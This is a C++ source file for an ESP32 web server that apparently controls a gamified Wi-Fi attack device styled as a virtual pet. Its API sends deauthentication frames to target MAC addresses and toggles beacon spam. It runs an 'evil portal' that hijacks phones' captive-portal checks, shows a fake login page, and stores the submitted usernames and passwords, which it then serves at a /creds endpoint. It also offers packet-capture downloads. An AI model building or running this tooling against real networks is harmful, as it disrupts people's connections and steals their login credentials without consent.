#include "webserver.h"
#include "zahl_pet.h"
#include "packet_sniffer.h"
#include "soul_ledger.h"
#include "evil_portal.h"
#include "beacon_spam.h"
#include "channel_hopper.h"
#include "pcap_writer.h"
#include <WiFi.h>
#include <WebServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

AsyncWebServer server(80);
AsyncEventSource events("/events");

// ---- API handler ----
void handleAPI(AsyncWebServerRequest* req) {
    if (!req->hasParam("action")) {
        req->send(400, "application/json", "{\"error\":\"missing action\"}");
        return;
    }
    String action = req->getParam("action")->value();

    // ---- feed ----
    if (action == "feed") {
        if (!req->hasParam("type")) { req->send(400, "application/json", "{\"error\":\"missing type\"}"); return; }
        String type = req->getParam("type")->value();
        if      (type == "snack")  { Zahl.feed(5); }
        else if (type == "hash")   { Zahl.feed(15); Zahl.addExperience(5); if (Zahl.corruption < 100) Zahl.corruption += 2; }
        else if (type == "deauth") { Zahl.feed(2); if (Zahl.corrosion < 100) Zahl.corrosion += 2; }
        req->send(200, "application/json", "{\"status\":\"fed\",\"hunger\":" + String(Zahl.hunger) + "}");
    }

    // ---- pet ----
    else if (action == "pet") {
        Zahl.pet();
        req->send(200, "application/json", "{\"status\":\"petted\"}");
    }

    // ---- deauth ----
    else if (action == "deauth_target") {
        if (!req->hasParam("mac")) { req->send(400, "application/json", "{\"error\":\"missing mac\"}"); return; }
        String mac = req->getParam("mac")->value();
        uint8_t tgt[6], rtr[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        sscanf(mac.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &tgt[0],&tgt[1],&tgt[2],&tgt[3],&tgt[4],&tgt[5]);
        sendDeauthFrame(tgt, rtr);
        req->send(200, "application/json", "{\"status\":\"deauth_sent\"}");
    }

    // ---- ritual ----
    else if (action == "ritual") {
        if (!req->hasParam("type")) { req->send(400, "application/json", "{\"error\":\"missing type\"}"); return; }
        int type = req->getParam("type")->value().toInt();
        bool ok = Zahl.performRitual((uint8_t)type);
        req->send(200, "application/json", ok ? "{\"status\":\"ritual_cast\"}" : "{\"error\":\"insufficient_souls\"}");
    }

    // ---- beacon spam ----
    else if (action == "beacon") {
        bool on = req->hasParam("on") && req->getParam("on")->value() == "1";
        setBeaconSpamEnabled(on);
        req->send(200, "application/json", "{\"beacon\":" + String(on ? "true" : "false") + "}");
    }

    // ---- evil portal ----
    else if (action == "portal") {
        bool on = req->hasParam("on") && req->getParam("on")->value() == "1";
        setPortalEnabled(on);
        req->send(200, "application/json", "{\"portal\":" + String(on ? "true" : "false") + "}");
    }

    // ---- channel hop ----
    else if (action == "hops") {
        if (req->hasParam("interval")) {
            setHopInterval(req->getParam("interval")->value().toInt());
        }
        bool en = !req->hasParam("en") || req->getParam("en")->value() != "0";
        setHopEnabled(en);
        req->send(200, "application/json", "{\"hopping\":" + String(en ? "true" : "false") + ",\"interval\":" + String(req->getParam("interval") ? req->getParam("interval")->value() : "200") + "}");
    }

    // ---- BLE scan ----
    else if (action == "ble_scan") {
        scanBLEDevices();
        req->send(200, "application/json", "{\"status\":\"ble_scanned\"}");
    }

    // ---- pcap rotate ----
    else if (action == "pcap_rotate") {
        rotatePcap();
        req->send(200, "application/json", "{\"status\":\"rotated\"}");
    }

    else {
        req->send(400, "application/json", "{\"error\":\"unknown action\"}");
    }
}

void initWebServer() {
    // ---- static files ----
    server.serveStatic("/", SPIFFS, "/").setDefaultFile("index.html");

    // ---- core API ----
    server.on("/api", HTTP_GET, handleAPI);

    server.on("/status", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send(200, "application/json", "{\"zahl\":" + getZahlJson() + "}");
    });

    server.on("/captures", HTTP_GET, [](AsyncWebServerRequest* req) {
        String json = "{\"captures\":[";
        int total = min(captureLogIndex, MAX_LOG_ENTRIES);
        for (int i = 0; i < min(total, 20); i++) {
            int idx = ((captureLogIndex - 1 - i) % MAX_LOG_ENTRIES + MAX_LOG_ENTRIES) % MAX_LOG_ENTRIES;
            if (i > 0) json += ",";
            json += "{\"mac\":\"" + String(captureLog[idx].data) + "\",\"rssi\":" + String(captureLog[idx].rssi) + "}";
        }
        json += "],\"networks\":[";
        int ntotal = min(networkLogIndex, MAX_LOG_ENTRIES);
        for (int i = 0; i < min(ntotal, 20); i++) {
            int idx = ((networkLogIndex - 1 - i) % MAX_LOG_ENTRIES + MAX_LOG_ENTRIES) % MAX_LOG_ENTRIES;
            if (i > 0) json += ",";
            json += "{\"ssid\":\"" + String(networkLog[idx].data) + "\",\"rssi\":" + String(networkLog[idx].rssi) + "}";
        }
        json += "]}";
        req->send(200, "application/json", json);
    });

    // ---- souls / journal ----
    server.on("/souls", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send(200, "application/json", getSoulsJson(30));
    });

    server.on("/journal", HTTP_GET, [](AsyncWebServerRequest* req) {
        String j = "{\"entries\":[";
        int start = max(0, soulCount - 5);
        bool first = true;
        for (int i = soulCount - 1; i >= start; i--) {
            if (!first) j += ",";
            first = false;
            j += "\"" + getJournalEntry(i) + "\"";
        }
        j += "]}";
        req->send(200, "application/json", j);
    });

    // ---- portal credentials ----
    server.on("/creds", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send(200, "application/json", getCredsJson());
    });

    // ---- PCAP download ----
    server.on("/pcap", HTTP_GET, [](AsyncWebServerRequest* req) {
        if (!SPIFFS.exists("/capture.pcap")) {
            req->send(404, "text/plain", "no capture");
            return;
        }
        req->send(SPIFFS, "/capture.pcap", "application/octet-stream", true);
    });

    // ---- evil portal routes ----
    server.on("/portal", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send_P(200, "text/html", getPortalHtml());
    });

    server.on("/portal/submit", HTTP_POST, [](AsyncWebServerRequest* req) {
        String user = req->hasParam("user", true) ? req->getParam("user", true)->value() : "";
        String pass = req->hasParam("pass", true) ? req->getParam("pass", true)->value() : "";
        handlePortalSubmit(user, pass);
        req->send_P(200, "text/html", getPortalSuccess());
    });

    // ---- captive portal detection ----
    auto portalRedirect = [](AsyncWebServerRequest* req) {
        if (isPortalActive())
            req->redirect("http://192.168.4.1/portal");
        else
            req->send(204);
    };
    server.on("/generate_204",         HTTP_GET, portalRedirect);
    server.on("/hotspot-detect.html",  HTTP_GET, portalRedirect);
    server.on("/ncsi.txt",             HTTP_GET, portalRedirect);
    server.on("/connecttest.txt",      HTTP_GET, portalRedirect);
    server.on("/redirect",             HTTP_GET, portalRedirect);

    server.onNotFound([](AsyncWebServerRequest* req) {
        if (isPortalActive())
            req->redirect("http://192.168.4.1/portal");
        else
            req->send(404, "text/plain", "not found");
    });

    // ---- SSE ----
    events.onConnect([](AsyncEventSourceClient* client) {
        client->send("hello", NULL, millis(), 1000);
    });
    server.addHandler(&events);

    server.begin();
    Serial.println("Web server on 192.168.4.1");

    xTaskCreate([](void*) {
        while (1) {
            events.send(getZahlStatus().c_str(), "status", millis());
            vTaskDelay(1000 / portTICK_PERIOD_MS);
        }
    }, "EventTask", 4096, NULL, 1, NULL);
}
